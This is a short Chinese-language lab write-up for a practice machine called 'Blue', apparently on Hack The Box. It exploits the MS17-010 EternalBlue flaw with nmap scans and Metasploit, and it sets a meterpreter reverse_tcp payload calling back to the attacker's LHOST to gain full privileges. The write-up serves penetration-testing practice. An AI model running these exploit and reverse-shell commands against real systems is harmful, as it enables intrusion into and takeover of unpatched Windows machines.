0x00:靶机介绍

这次的靶机是Blue其实是永恒之蓝MS17-010的漏洞复现过程。利用MSF比较简单

0x01:探测靶机端口

先使用波nmap探测以下端口主要开了135，139和445端口其它端口不用太在意。
命令:nmap -A -sS -sV -v -p- 10.10.10.40

0x02:探测是否存在MS17-010漏洞

然后用波nmap的script vuln功能探测,下面提示出现了ms17-010可利用
命令:nmap –script vuln 10.10.10.40

或者是进入MSF里面先使用search ms17-010,然后在利用scanner功能去探测

当出现Host is likely vulnerable的时候就代表漏洞存在
命令: use 1
       Set RHOSTS 10.10.10.40
       exploit

0x03:利用MSF获得shell

这里由于确认了。我们开始启动MSF模块
命令: use exploit/windows/ms17_010_eternalblue
       Set RHOSTS 10.10.10.40
       Set LHOST 10.10.14.35
       Set payload windows/x64/meterpreter/reverse_tcp

最后输入个run直接打到最高权限
